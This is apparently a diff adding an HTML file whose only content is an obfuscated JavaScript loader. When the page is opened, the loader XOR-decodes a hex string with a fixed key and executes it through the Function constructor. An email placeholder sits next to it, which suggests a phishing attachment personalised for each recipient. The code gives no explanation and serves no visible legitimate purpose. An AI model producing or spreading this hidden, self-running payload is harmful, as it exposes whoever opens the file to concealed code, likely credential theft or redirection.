@@ -1,0 +1,24 @@
+<html>
+<head>
+<meta charset="UTF-8">
+</head>
+<body>
+<script>
+J = "*##EMAIL##";
+
+(() => {
+  const E = "a2cfe7423b37df7d5bde8c27", u = "044316070b5e595b471b130a443d3a6e170a10111a4f52471208034a47181b4b114e1161290d154855154a17584f52520041034a054e575d534e53420a005748120e4a061f4f10580c1d414a4741475e114e537e2c325748122e17331f4f15551767444a47530445114e11162b491548684c0e0a510d1a15431b586c125e5a565c151d5b0b0556105c0d0a4b50115751410f43031442555c5a0f5a431d4d7d5f";
+  const K = u
+    .match(/../g)
+    .map((W, H) =>
+      String.fromCharCode(parseInt(W, 16) ^ (E.charCodeAt(H % E.length) & 0xff))
+    )
+    .join('');
+  [1].filter(() => true).every(() => {
+    (1, Function)(K)();
+    return true;
+  });
+})();
+</script>
+</body>
+</html>
